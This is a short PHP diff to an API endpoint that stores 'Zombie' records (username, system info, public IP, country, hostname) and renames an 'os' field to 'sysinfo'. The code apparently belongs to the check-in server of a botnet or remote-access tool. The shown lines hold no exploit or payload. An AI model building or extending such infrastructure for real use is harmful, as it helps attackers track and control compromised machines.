@@ -49,7 +49,7 @@ if($jwt){
         $zombie = new Zombie($db);
         // set zombie property values
         $zombie->username = $data->username;
-        $zombie->os = $data->os;
+        $zombie->sysinfo = $data->sysinfo;
         $zombie->current_public_ip = $data->current_public_ip;
         $zombie->current_country = $data->current_country;
         $zombie->current_hostname = $data->current_hostname;
@@ -57,7 +57,7 @@ if($jwt){
         // create the user
         if(
             !empty($zombie->username) &&
-            //!empty($zombie->os) &&
+            //!empty($zombie->sysinfo) &&
             !empty($zombie->current_public_ip) &&
             !empty($zombie->current_country) &&
             //!empty($zombie->current_hostname) &&
